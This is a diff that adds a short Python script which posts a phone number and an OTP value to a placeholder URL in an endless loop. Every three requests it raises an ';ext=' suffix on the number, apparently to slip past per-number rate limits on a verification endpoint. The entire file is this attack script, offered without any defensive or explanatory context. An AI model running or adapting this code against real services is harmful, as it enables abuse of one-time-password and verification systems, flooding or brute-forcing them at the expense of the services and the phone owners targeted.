@@ -1,0 +1,30 @@
+import requests
+
+def send_request():
+    # Set the base URL for the POST request
+    url = 'http://example.com/'
+
+    # Set the initial phone number and OTP values
+    phone_number = "+380931111111;ext=1"
+    otp = 1234
+
+    # Initialize a counter to keep track of the number of requests sent
+    counter = 0
+
+    while True:
+        # Increment the extension number every three requests
+        if counter % 3 == 0:
+            ext_index = phone_number.find('ext=')
+            ext = int(phone_number[ext_index+4:])
+            ext += 1
+            phone_number = phone_number[:ext_index] + f'ext={ext}'
+
+        # Send the POST request with the updated phone number and OTP
+        data = {'number': phone_number, 'otp': otp}
+        response = requests.post(url, json=data)
+
+        # Increment the counter
+        counter += 1
+
+if __name__ == '__main__':
+    send_request()
